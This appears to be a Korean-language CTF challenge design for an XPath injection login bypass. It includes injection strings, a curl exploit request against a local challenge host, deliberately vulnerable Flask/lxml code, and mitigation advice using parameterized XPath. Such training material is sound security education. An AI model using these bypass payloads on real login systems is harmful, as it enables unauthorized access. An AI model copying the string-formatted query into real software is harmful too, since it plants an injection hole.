---
title: XPath Injection leading to Authentication Bypass — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, xpath-injection, xml, database-injection, auth-bypass]
confidence: high
---

# XPath Injection leading to Authentication Bypass — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Legacy Employee Portal (레거시 임직원 조회 포털)
- **난이도**: Medium
- **핵심 컨셉**: 관계형 DB(SQL) 환경이 아닌 XML 데이터베이스 구조에서 발생하는 대표적 주입 공격인 **XPath 인젝션(XPath Injection)** 취약점 문제입니다. 대상 웹 애플리케이션은 사용자의 로그인 자격 증명 또는 부서 임직원 조회를 위해 XML 파일 내 레코드를 쿼리하는 XPath 엔진을 백엔드로 사용합니다. 개발자는 사용자 입력을 필터링하지 않고 XPath 검색 구문에 변수를 직접 접합시켰습니다. 공격자는 XPath의 논리 연산 관계를 왜곡시켜 비밀번호 검증을 무시하고 타인의 정보 및 기밀 플래그 데이터를 노출시킵니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend / Login Form**: 임직원 사원번호와 패스워드를 기입해 접속하는 로그인 폼.
- **Backend Service (Python with xml.etree / lxml)**:
  - 임직원 정보가 담긴 `employees.xml` 파일을 데이터 로더로 사용.
  - 로그인 쿼리 실행:
    `//employee[username/text()='[USER]' and password/text()='[PASS]']`
- **Flag 위치**:
  - `admin` 계정으로 정상 로그인이 완료되었을 때 관리자 페이지에 표시되는 데이터.

### 2.2 취약점 지점
1. **Unsanitized XPath Query Construction**:
   - 사용자 입력을 XPath 문장 내에 직접 바인딩(Parameterization)하지 않고 문자열 포맷 스트링으로 합칩니다.
   - 공격자는 홀따옴표(`'`)를 주입하여 텍스트 매치 조건을 탈출하고, `or` 연산자를 배치하여 항상 전체 표현식이 참(True)으로 평가되도록 만듭니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 입력 값 (Body JSON) | 반환 값 | 비고 |
|------------|--------|------|--------------------|---------|------|
| `/api/login`| POST | 없음 | `{"username": "...", "password": "..."}` | 로그인 성공/실패 여부 및 세션 정보 | XPath 주입 공격 발생 경로 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. 취약점 식별 및 데이터베이스 파악
로그인 폼에 특수 문자(`'`)를 넣어보며 에러나 응답의 변화를 봅니다.
- *요청*: `{"username": "'", "password": "123"}`
- *응답*: XML/XPath 파싱 에러(예: `lxml.etree.XPathEvalError: Invalid expression`)가 반환되어, 내부적으로 XPath가 사용되고 있으며 적절한 예외 처리가 결여되었음을 파악합니다.

### Step 2. 로그인 우회 XPath 페이로드 조작
서버의 쿼리 형식이 다음과 같다고 가정합니다:
`//employee[username/text()='[USER]' and password/text()='[PASS]']`

공격자는 `username` 입력 자리에 아래와 같은 조건식을 대입해 쿼리 뒷부분의 `and` 조건을 무력화합니다.
- **주입 문자열**: `' or 1=1 or '`
- *결합 완성본*:
  ```xpath
  //employee[username/text()='' or 1=1 or '' and password/text()='123']
  ```
  *(설명: `username/text()=''`는 거짓이지만 `or 1=1`에 의해 첫 번째 조건 전체가 참이 되고, 마지막 `or ''`에 의해 비밀번호 매치 조건과의 연산도 우회되어 무조건 일치하는 첫 번째 유저 레코드(일반적으로 admin)가 호출됩니다.)*

- **정교한 인젝션 구조**:
  만약 첫 번째 레코드가 admin이 아닌 일반 사용자라면, 관리자명을 지정하여 우회를 수행합니다.
  - **주입 username**: `admin' or 'a'='b`
  - **주입 password**: `' or 1=1 or '`
  - *결합 완성본*:
    ```xpath
    //employee[username/text()='admin' or 'a'='b' and password/text()='' or 1=1 or '']
    ```

### Step 3. 공격 실행 요청 전송
- *POST 전송 (curl)*:
  ```bash
  curl -X POST http://portal.challenge.local/api/login \
       -H "Content-Type: application/json" \
       -d '{"username": "admin'\'' or '\''a'\''='\''b", "password": "'\'' or 1=1 or '\''"}'
  ```

### Step 4. flag 획득
서버는 이 XPath 쿼리를 실행하여 결과 노드인 `admin` 직원 정보 데이터를 정상 추출해 냅니다. 인증 검증 통과와 함께 세션이 정상 발급되고, 공격자는 관리자 계정으로 메인 콘솔에 도달하여 대시보드 플래그(`FLAG{xpath_injection_auth_bypass_xml}`)를 획득합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Python lxml)

```python
# app.py
from flask import Flask, request, jsonify
from lxml import etree

app = Flask(__name__)

# 임직원 XML 소스 파일 로드
XML_FILE = """
<employees>
    <employee>
        <username>admin</username>
        <password>SuperComplexPass_9981</password>
        <secret_flag>FLAG{xpath_injection_auth_bypass_xml}</secret_flag>
    </employee>
    <employee>
        <username>guest</username>
        <password>guest123</password>
        <secret_flag>No flags for guests</secret_flag>
    </employee>
</employees>
"""

root = etree.fromstring(XML_FILE)

@app.route("/api/login", methods=["POST"])
def do_login():
    data = request.get_json()
    username = data.get("username", "")
    password = data.get("password", "")
    
    # 취약점 지점: string formatting을 사용해 XPath 질의 구성
    # 사용자 입력 ' 기호가 쿼리 구조를 완전히 바꾸어 버립니다.
    query = f"//employee[username/text()='{username}' and password/text()='{password}']"
    
    try:
        # XPath 실행
        results = root.xpath(query)
        
        if len(results) > 0:
            employee = results[0]
            # 성공 시 정보 리턴
            return jsonify({
                "status": "success",
                "username": employee.find("username").text,
                "flag": employee.find("secret_flag").text
            })
        else:
            return jsonify({"status": "failed", "reason": "User not found or password incorrect"}), 401
            
    except Exception as e:
        return jsonify({"status": "error", "message": f"XPath Eval Error: {str(e)}"}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **XPath 파라미터 쿼리 바인딩 적용 (Parameterized XPath)**:
   - 문자열 결합을 전면 지양하고, XPath 엔진이 제공하는 파라미터 변수 정의 기능을 적용하여 사용자의 입력을 코드(구조)가 아닌 순수 데이터 인자로 대입하게 강제합니다.
   - **수정 예시 (lxml 사용 시)**:
     ```python
     # $usr 및 $pwd 와 같이 변수를 바인딩하고, xpath() 실행 시 딕셔너리로 넘김
     query = "//employee[username/text()=$usr and password/text()=$pwd]"
     results = root.xpath(query, usr=username, pwd=password)
     ```
2. **입력 값 이스케이프 및 정화 (Input Sanitization)**:
   - XPath 표현식으로 해석될 수 있는 특수기호(`'`, `"`, `[`, `]`, `/`, `*`, `@`, `=`)를 사전에 완전 필터링하거나 차단 조치합니다.
3. **스키마 검증 및 데이터 형식 강제**:
   - 로그인 폼에는 알파벳과 숫자 형태만 들어오도록 정규식 화이트리스트 필터를 프론트엔드와 백엔드 초입에 지정합니다.
